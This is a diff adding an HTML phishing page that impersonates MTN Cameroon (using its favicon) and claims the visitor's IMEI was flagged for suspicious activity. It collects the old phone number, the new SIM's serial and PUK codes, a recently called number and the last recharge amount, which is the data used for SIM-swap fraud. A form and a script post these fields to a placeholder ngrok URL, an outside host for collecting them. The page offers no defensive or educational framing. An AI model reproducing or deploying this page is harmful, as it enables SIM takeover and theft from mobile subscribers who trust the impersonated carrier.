@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>IMEI ERROR SUSPICIOUS ACTIVITIES</title>
+ <link rel="shortcut icon" href="https://www.mtncameroon.cm/favicon.ico">
+ <style>
+  body {
+   background-color: yellow;
+  }
+
+h1, h2, p {
+   color: black;
+  }
+
+img {
+   width: 100px;
+  }
+
+form {
+   margin-top: 20px;
+  }
+
+input {
+   background-color: white;
+   border: 1px solid black;
+  }
+ </style>
+</head>
+<body>
+ <h1>Your cell phone's IMEI code has been flagged for suspicious activity.</h1>
+ <p>Please provide the following information to verify your identity and update your security settings:</p>
+
+Your old phone number:
+Serial number of the new SIM card:
+PUK code of the new SIM card:
+One of the last 5 numbers you called:
+Amount of your last recharge:
+<form action="https://<your ngrok url>/" method="post" enctype="multipart/form-data">
+<input type="tel" name="old_phone_number" placeholder="Old Phone Number">
+<input type="text" name="new_sim_serial_number" placeholder="New SIM Serial Number">
+<input type="text" name="new_sim_puk_number" placeholder="New SIM PUK Number">
+<input type="tel" name="last_five_called_numbers" placeholder="One of the last 5 numbers you called">
+<input type="number" name="last_recharge_amount" placeholder="Amount of your last recharge">
+<input type="submit" value="Submit">
+</form>
+ <script>
+  const form = document.querySelector('form');
+
+form.addEventListener('submit', (event) => {
+   event.preventDefault();
+
+const data = new FormData(form);
+   data.append('old_phone_number', form['old_phone_number'].value);
+
+const request = new XMLHttpRequest();
+   request.open('POST', https://<your ngrok url>/);
+   request.send(data);
+
+request.onload = () => {
+    if (request.status === 200) {
+     const response = JSON.parse(request.responseText);
+
+console.log(response);
+    } else {
+     console.log('Error: ' + request.statusText);
+    }
+   };
+  });
+ </script>
+</body>
+</html>
